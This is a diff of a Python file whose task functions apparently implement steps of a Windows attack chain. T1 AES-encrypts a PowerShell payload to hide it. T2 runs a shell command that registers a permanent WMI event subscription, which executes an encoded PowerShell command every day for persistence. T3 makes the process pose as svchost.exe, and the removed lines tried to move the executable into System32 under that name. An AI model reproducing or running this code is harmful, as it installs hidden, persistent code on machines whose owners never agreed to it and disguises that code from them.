@@ -8,27 +8,27 @@ import ctypes
 from typing import Dict, Any
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
-import winreg
+from Crypto.Random import get_random_bytes
 
 def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Generate a random 16-byte key and IV
-        key = os.urandom(16)
+        # Define a simple PowerShell script to obfuscate
+        powershell_script = "Write-Host 'Hello, World!'"
+        
+        # Generate a random AES key and IV
+        key = get_random_bytes(16)
         iv = os.urandom(16)
         
-        # Example PowerShell payload to be obfuscated
-        payload = "Write-Host 'Hello, World!'"
+        # Pad the script to a 16-byte boundary
+        padded_script = pad(powershell_script.encode(), AES.block_size)
         
-        # Pad the payload to a 16-byte boundary
-        padded_payload = pad(payload.encode(), AES.block_size)
-        
-        # Encrypt the padded payload using AES CBC mode
+        # Encrypt the script using AES CBC mode
         cipher = AES.new(key, AES.MODE_CBC, iv)
-        ciphertext = cipher.encrypt(padded_payload)
+        ciphertext = cipher.encrypt(padded_script)
         
-        # Create the obfuscated script with key and iv as hex strings
+        # Create the obfuscated script as a hex string
         obfuscated_script = {
             'ciphertext': ciphertext.hex(),
             'key': key.hex(),
@@ -36,9 +36,8 @@ def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
         }
         
         # Convert the obfuscated script to a JSON string
-        script = json.dumps(obfuscated_script)
+        result = {'script': json.dumps(obfuscated_script)}
         
-        result = {'script': script}
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
     except Exception as e:
@@ -50,65 +49,55 @@ def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Extract the obfuscated PowerShell script from input_data
         script = input_data.get('script', '')
 
-        # Define the WMI Event Subscription command
-        subscription_name = "StartupScript"
-        command = f"powershell.exe -EncodedCommand {script}"
-
-        # Create the WMI Event Subscription using PowerShell
-        wmi_command = (
-            f"Register-WmiEvent -Query \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE "
-            f"TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 8 AND TargetInstance.Minute = 0\" "
-            f"-Action {{ {command} }} -Name {subscription_name}"
+        # Define the WMI command to create an event subscription
+        subscription_name = "MyWMIEventSubscription"
+        command = (
+            f"powershell -Command \""
+            f"$Filter=Set-WmiInstance -Namespace 'root\\subscription' -Class __EventFilter "
+            f"-Arguments @{{Name='{subscription_name}'; EventNamespace='Root\\Cimv2'; "
+            f"QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE "
+            f"TargetInstance ISA \"Win32_LocalTime\" AND TargetInstance.Hour = 0 AND TargetInstance.Minute = 0'}}; "
+            f"$Consumer=Set-WmiInstance -Namespace 'root\\subscription' -Class CommandLineEventConsumer "
+            f"-Arguments @{{Name='{subscription_name}'; CommandLineTemplate='powershell -EncodedCommand {script}'}}; "
+            f"$Binding=Set-WmiInstance -Namespace 'root\\subscription' -Class __FilterToConsumerBinding "
+            f"-Arguments @{{Filter=$Filter; Consumer=$Consumer}}\""
         )
 
-        # Execute the PowerShell command
-        subprocess.run(["powershell.exe", "-Command", wmi_command], capture_output=True, timeout=30)
+        # Execute the command to create the WMI event subscription
+        subprocess.run(command, shell=True, check=True, timeout=10)
 
-        # Return the subscription ID (name used for the subscription)
         result = {'subscription_id': subscription_name}
-
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
     except Exception as e:
-        return {'success': False, 'data': {'subscription_id': None},
-                'error': f'{type(e).__name__}: {e}',
+        # Return partial result with fallback value None for subscription_id
+        return {'success': False, 'data': {'subscription_id': None}, 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
 
 def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Define the target service name to masquerade as
+        # Define the legitimate service name to masquerade as
         legitimate_service_name = "svchost.exe"
         
-        # Get the current executable path
-        current_exe = sys.executable
-        
-        # Determine the target path in system32 directory
-        system32_path = os.path.join(os.environ.get('WINDIR', 'C:\\Windows'), 'System32', legitimate_service_name)
-        
-        # Attempt to copy the current executable to the system32 directory with the legitimate service name
+        # Use ctypes to attempt to set the process name
         try:
-            # Use ctypes to set the process name if needed
             ctypes.windll.kernel32.SetConsoleTitleW(legitimate_service_name)
-            os.rename(current_exe, system32_path)
-            renamed = True
+            process_name = legitimate_service_name
         except Exception:
-            renamed = False
-        
-        # Prepare the result
+            # If setting the process name fails, log and return with a fallback value
+            process_name = None
+
         result = {
-            "service_name": legitimate_service_name if renamed else None
+            "process_name": process_name
         }
-        
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
     except Exception as e:
-        return {'success': False, 'data': {'service_name': None},
-                'error': f'{type(e).__name__}: {e}',
+        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
 
 def main() -> dict:
